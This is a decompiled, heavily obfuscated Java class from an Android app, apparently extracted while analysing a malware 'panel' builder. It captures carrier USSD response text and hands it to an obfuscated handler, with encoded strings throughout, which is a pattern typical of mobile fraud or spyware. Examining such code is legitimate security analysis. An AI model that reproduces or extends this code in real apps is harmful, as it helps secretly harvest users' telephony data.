package v.s;

import android.telephony.TelephonyManager;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class e8sugqmdFodXv extends TelephonyManager.UssdResponseCallback {
    public final /* synthetic */ Object dDIMxZXP1V8HdM;
    public final /* synthetic */ ax0gnbsXD3up2 vekpFI4d1Nc4fakF;
    public final /* synthetic */ RsA5TguOLrFfTXOtR w9sT1Swbhx3hs;

    public e8sugqmdFodXv(Object obj, RsA5TguOLrFfTXOtR rsA5TguOLrFfTXOtR, ax0gnbsXD3up2 ax0gnbsxd3up2) {
        this.dDIMxZXP1V8HdM = obj;
        this.w9sT1Swbhx3hs = rsA5TguOLrFfTXOtR;
        this.vekpFI4d1Nc4fakF = ax0gnbsxd3up2;
    }

    private static /* synthetic */ void jenqsunbtb() {
    }

    @Override // android.telephony.TelephonyManager.UssdResponseCallback
    public final void onReceiveUssdResponse(TelephonyManager telephonyManager, String str, CharSequence charSequence) {
        String str2 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
        TypefaceCache.obtain("00160045006800A300B000AD00D700B4003300790055009400F500E50092");
        charSequence.toString();
        SyncQYAdapter.Q7qC5ia93qGCjkBXCF0A(this.dDIMxZXP1V8HdM, this.w9sT1Swbhx3hs, this.vekpFI4d1Nc4fakF, charSequence.toString());
    }

    @Override // android.telephony.TelephonyManager.UssdResponseCallback
    public final void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String str, int i) {
        String str2 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
        TypefaceCache.obtain("00160045006800A300B000B900D300AE002F0073005F00DD00B0");
        SyncQYAdapter.Q7qC5ia93qGCjkBXCF0A(this.dDIMxZXP1V8HdM, this.w9sT1Swbhx3hs, this.vekpFI4d1Nc4fakF, null);
    }
}
